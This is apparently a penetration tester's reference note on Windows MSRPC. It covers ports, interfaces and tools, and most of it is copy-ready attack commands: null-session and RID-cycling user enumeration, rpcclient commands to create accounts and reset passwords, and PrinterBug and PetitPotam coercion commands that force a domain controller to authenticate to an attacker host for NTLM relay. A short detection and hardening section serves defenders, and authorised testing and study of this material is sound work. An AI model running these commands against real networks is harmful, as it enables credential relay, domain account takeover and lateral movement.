# RPC

#RPC #RemoteProcedureCall #MSRPC #localsystemmanagement

## What is RPC?

Remote Procedure Call — the plumbing that lets a program run code on a remote system. On Windows, **MSRPC** (DCE/RPC) is the transport under SMB, DCOM, WMI, the Service Control Manager, SAMR/LSAD, and directory replication — so "attacking RPC" usually means enumerating those interfaces or abusing a specific one (SAMR for user enum, MS-RPRN/EFSRPC for authentication coercion). The **endpoint mapper** on TCP 135 hands out the dynamic ports each RPC service actually listens on.

- Port **TCP 135** — endpoint mapper (MSRPC); **TCP 593** — RPC over HTTP
- Dynamic ports **49152–65535** (modern Windows; negotiated via 135)
- Linux `rpcbind` — **TCP/UDP 111** (NFS and other Sun-RPC services)

| Interface | Purpose (why you care) |
|---|---|
| MS-SAMR | Security Account Manager — user/group enum (`samrdump`, `rpcclient`) |
| MS-LSAD/LSAT | Local Security Authority — SID↔name lookups (`lookupsid`) |
| MS-SCMR | Service Control Manager — remote service create → exec (`services.py`, psexec) |
| MS-DRSR | Directory replication — DCSync (`secretsdump -use-vss`/DRSUAPI) |
| MS-RPRN / MS-EFSRPC / MS-FSRVP / MS-DFSNM | **Coercion** interfaces (PrinterBug / PetitPotam / ShadowCoerce / DFSCoerce) |

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Lateral Movement/RPCclient\|rpcclient]] | Interactive MSRPC — user/group/share enum, RID lookups, user creation |
| [[Tools/Lateral Movement/impacket\|impacket]] | `rpcdump`, `lookupsid`, `samrdump`, and the coercion PoCs |
| [[Tools/Lateral Movement/NetExec\|NetExec]] | `--rid-brute`, `-M coerce_plus`, MSRPC-backed enum |
| [[Tools/Scanning/NMAP\|NMAP]] | `msrpc-enum`, `rpcinfo`, `rpc-grind` NSE |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `dcerpc/endpoint_mapper`, `dcerpc/tcp_dcerpc_auditor` |

---

## Enumeration

```bash
# Endpoint mapper — list every registered RPC service + its dynamic port
impacket-rpcdump <target>
impacket-rpcdump <domain>/<user>:<pass>@<target>

# Nmap
nmap -p 135 --script msrpc-enum -sV <target>
nmap -sU -p 111 --script rpcinfo <target>       # Linux rpcbind

# SID/user enumeration over MSRPC
impacket-lookupsid <domain>/<user>:<pass>@<target> | grep SidTypeUser
impacket-samrdump <domain>/<user>:<pass>@<target>

# Metasploit
use auxiliary/scanner/dcerpc/endpoint_mapper
```

---

## Connect / Access — rpcclient

```bash
# Null session (anonymous) — the classic unauthenticated enum
rpcclient -U "" -N <target>

# Authenticated
rpcclient -U 'domain/user%Password123' <target>
```

```
srvinfo                       # server/OS info
querydominfo                  # domain info
enumdomusers                  # all users (+ RIDs)
queryuser 0x1f4               # detail for one RID (hex)
enumdomgroups / querygroup 0x200
netshareenumall               # shares
getdompwinfo                  # password policy
lookupnames <user> / lookupsids <SID>
createdomuser <user>          # add a user (if privileged)
setuserinfo2 <user> 23 <newpw># change a password (if privileged)
```

---

## Attack Vectors

### RID cycling (user enum via null/authenticated session)

```bash
# Loop RIDs when enumdomusers is restricted
for i in $(seq 500 1100); do
  rpcclient -N -U "" <target> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"
done
# NetExec does this cleanly:
nxc smb <target> -u guest -p '' --rid-brute
```

### Authentication coercion → NTLM relay

The high-value modern RPC attack: force a target (often a DC) to authenticate to you over an RPC interface, then relay that auth (usually to LDAP for RBCD/shadow-cred, or to another SMB host). All are separate RPC interfaces, so if one is patched try the next:

```bash
impacket-printerbug  <domain>/<user>:<pass>@<DC> <attacker>   # MS-RPRN (PrinterBug)
impacket-petitpotam  <attacker> <DC>                          # MS-EFSRPC (PetitPotam, often pre-auth)
# ShadowCoerce = MS-FSRVP, DFSCoerce = MS-DFSNM (coercer.py / dfscoerce.py)
nxc smb <DC> -u <user> -p <pass> -M coerce_plus                # find which coercion surfaces are live
```

Point the coerced auth at `ntlmrelayx` — full relay chain in [[Services/File Xfer/SMB|SMB]] (NTLM Relay).

### Remote code execution over MSRPC

Service-control (MS-SCMR) and task-scheduler RPC back the impacket exec tools — `psexec`/`smbexec` (SCMR), `atexec` (ATSVC), `dcomexec` (DCOM). See [[Services/File Xfer/SMB|SMB]] and [[Services/Local System Management/WMI|WMI]].

---

## Detection & Artefacts

- **`rpcdump`/endpoint-mapper sweeps** are benign-looking 135 connections but bulk interface enumeration from one source is a recon tell.
- **Coercion** leaves the fingerprint of the specific interface: MS-RPRN `RpcRemoteFindFirstPrinterChangeNotification`, MS-EFSRPC `EfsRpcOpenFileRaw` — plus an outbound auth from the DC to an unexpected host. Relayed logons show the attacker IP with a DC/computer account.
- **Null-session enum / RID cycling** = many anonymous logons + SAMR queries (event 4661/4662 on a DC).
- Defensive baseline: block 135/593 at the perimeter, disable the Print Spooler on DCs (PrinterBug), apply EFSRPC/PetitPotam patches + EPA/SMB signing to kill relay, and restrict anonymous SAMR (`RestrictRemoteSam`).

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Null session allowed | Unauthenticated user/group/share enumeration + RID cycling |
| Print Spooler running on a DC | MS-RPRN coercion → relay |
| EFSRPC/FSRVP/DFSNM reachable, unpatched | PetitPotam/ShadowCoerce/DFSCoerce coercion → relay |
| No SMB signing / EPA | Coerced auth is relayable |
| RPC (135/593) exposed to untrusted networks | DCOM/WMI/SCMR attack surface |
| `RestrictRemoteSam` not set | Anonymous SAMR user enumeration |

---

## Quick Reference

| Goal | Command |
|---|---|
| Dump RPC endpoints | `impacket-rpcdump host` |
| Null session enum | `rpcclient -U "" -N host` → `enumdomusers` |
| SID/user enum | `impacket-lookupsid host` |
| SAM dump | `impacket-samrdump host` |
| RID brute | `nxc smb host -u guest -p '' --rid-brute` |
| PrinterBug coerce | `impacket-printerbug dom/user:pass@DC attacker` |
| PetitPotam coerce | `impacket-petitpotam attacker DC` |
| Find coercion surface | `nxc smb DC -u user -p pass -M coerce_plus` |
| Nmap | `nmap -p 135 --script msrpc-enum host` |

---

> [!note] **See also** — MSRPC is the transport under [[Services/File Xfer/SMB|SMB]] (relay/exec), [[Services/Local System Management/WMI|WMI]] (DCOM exec), and [[Services/Local System Management/WinRM|WinRM]]; coercion feeds the SMB NTLM-relay chain; Linux Sun-RPC/portmapper fronts [[Services/File Xfer/NFS|NFS]].

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
